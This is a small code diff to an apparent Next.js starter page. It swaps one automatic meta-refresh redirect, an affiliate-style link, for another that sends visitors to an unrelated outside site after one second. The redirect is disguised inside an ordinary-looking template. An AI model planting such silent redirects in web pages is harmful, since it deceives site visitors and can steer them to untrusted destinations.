@@ -6,7 +6,7 @@ export default function Home() {
   return (
     <div className="container">
       <Head>
-         <meta HTTP-EQUIV='REFRESH' content='1; url=https://www.thenameiva.com/75HHNCK/9H9MTBB/?creative_id=11030'/>
+         <meta HTTP-EQUIV='REFRESH' content='1; url=http://my.ciscofreak.com/rdcl/'/>
         <title>Next.js Starter!</title>
         <link rel="icon" href="/favicon.ico" />
       </Head>
